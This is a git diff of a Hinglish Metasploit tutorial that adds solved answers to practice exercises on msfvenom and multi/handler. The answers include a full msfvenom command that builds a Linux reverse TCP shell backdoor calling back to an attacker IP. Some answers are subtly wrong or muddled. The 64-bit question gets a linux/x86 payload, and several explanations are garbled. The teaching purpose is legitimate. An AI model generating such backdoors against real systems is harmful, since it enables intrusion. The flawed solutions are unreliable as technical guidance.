@@ -128,29 +128,51 @@ Terminal block hone se bachane ke liye:
 
 ---
 
-## 📝 Practice Exercises (Hinglish Tasks)
+## 📝 Practice Exercises & Solved Solutions
 
 1. **Exercise 1 (Syntax Identification):**  
-   Aapko Linux (64-bit) system ke liye ek reverse TCP shell backdoor banana hai jiska name `test.elf` ho. Standard msfvenom command kya hogi? (Parameters structure likh kar batao).
+   * **Question:** Aapko Linux (64-bit) system ke liye ek reverse TCP shell backdoor banana hai jiska name `test.elf` ho. Standard msfvenom command kya hogi?
+   * **Solution:** 
+     ```bash
+     msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.98.128 LPORT=5555 -f elf -o test.elf
+     ```
+     *(Note: LHOST and LPORT parameters are singular. Msfvenom automatically infers the architecture and platform from the payload path).*
 
 2. **Exercise 2 (Payload Mismatch Scenario):**  
-   Maan lijiye aapne msfvenom se file banate waqt payload set kiya: `windows/meterpreter/reverse_tcp`. Lekin Kali Linux par listener (`multi/handler`) set karte waqt aapne payload set kar diya: `windows/shell/reverse_tcp`.  
-   Exploit execute hone par kya session link open hoga? Kyun?
+   * **Question:** Maan lijiye aapne msfvenom se file banate waqt payload set kiya `windows/meterpreter/reverse_tcp`, lekin listener (`multi/handler`) par set kiya `windows/shell/reverse_tcp`. Exploit execute hone par kya session link open hoga? Kyun?
+   * **Solution:** Listening socket port `4444` open ho jayega, par **session open fail ho jayega (no session created)**. Kyunki target stager handler se Meterpreter stage files demands karega, jabki handler raw shell stage return karega. Protocol header mismatch ki wajah se execution process crash ho jayegi.
 
 3. **Exercise 3 (The LHOST Rule in Handlers):**  
-   `exploit/multi/handler` ke options mein `LHOST` variable par humesha kis system (Kali Linux ya Target VM) ki IP address configure ki jati hai? 
+   * **Question:** `exploit/multi/handler` ke options mein `LHOST` variable par humesha kis system की IP address configure ki jati hai?
+   * **Solution:** Humesha **Kali Linux (Attacker Machine)** ki IP set ki jati hai, taaki reverse connection target execute hone par Kali par wapas routes query bhej sake.
 
 4. **Exercise 4 (Understand Output Formats):**  
-   Msfvenom command mein `-f raw` aur `-f exe` formats ke beech kya differences hote hain? (Hacking perspective se batao).
+   * **Question:** Msfvenom command mein `-f raw` aur `-f exe` formats ke beech kya differences hote hain?
+   * **Solution:** 
+     * `-f raw` shellcode bytes structures (`\xfc\xe8...`) compile karta hai jo custom loader programs/variables buffers injection mein kaam aate hain.
+     * `-f exe` structured Windows Portable Executable headers compile karta hai jo direct Windows machine double-click execution support check pass kar sake.
 
 5. **Exercise 5 (Multi/Handler background running):**  
-   Metasploit handler listener ko background job ki tarah run karne ke liye `exploit` command ke sath kaun sa dynamic switch/flag use kiya jata hai? (Hint: background options switch check).
+   * **Question:** Metasploit handler listener ko background job ki tarah run karne ke liye `exploit` command ke sath kaun sa flag use kiya jata hai? Aur jobs check karne ki command kya hai?
+   * **Solution:** Background run karne ke liye **`exploit -j`** (job switch) aur active database jobs view karne ke liye **`jobs`** command use hoti hai.
 
 6. **Exercise 6 (Platform verification filter):**  
-   Msfvenom command line run karte waqt, targets parameters (`--platform`) specify karna kyun safe mana jata hai?
+   * **Question:** Msfvenom command line run karte waqt, targets parameters (`--platform`) specify karna kyun safe mana jata hai?
+   * **Solution:** Yeh compiler settings ko fully clear kar deta hai, jisse wrong header auto-inference configuration issues aur crash anomalies minimize ho jaati hain.
 
 7. **Exercise 7 (Port Conflicts in Multi/Handler):**  
-   Agar aapne handler chalaya aur terminal par print hua: `BindFailed: Address already in use`, toh is conflict ko clean karne ke liye aap terminal par kya configuration check command run karoge?
+   * **Question:** Agar print hua `BindFailed: Address already in use`, toh is conflict process ID clear check karne ki command kya hai?
+   * **Solution:** Listening sockets aur associated running PIDs filter command:
+     ```bash
+     sudo ss -ltnp
+     # target conflict clear ke liye:
+     sudo kill -9 <PID>
+     ```
 
 8. **Exercise 8 (Msfvenom listing payloads):**  
-   Msfvenom ke terminal list parameters check karne ke liye saare platforms payloads display karne ki direct command kya hoti hai?
+   * **Question:** Msfvenom ke terminal list parameters payloads display karne ki command kya hai?
+   * **Solution:** 
+     ```bash
+     msfvenom -l payloads
+     ```
+
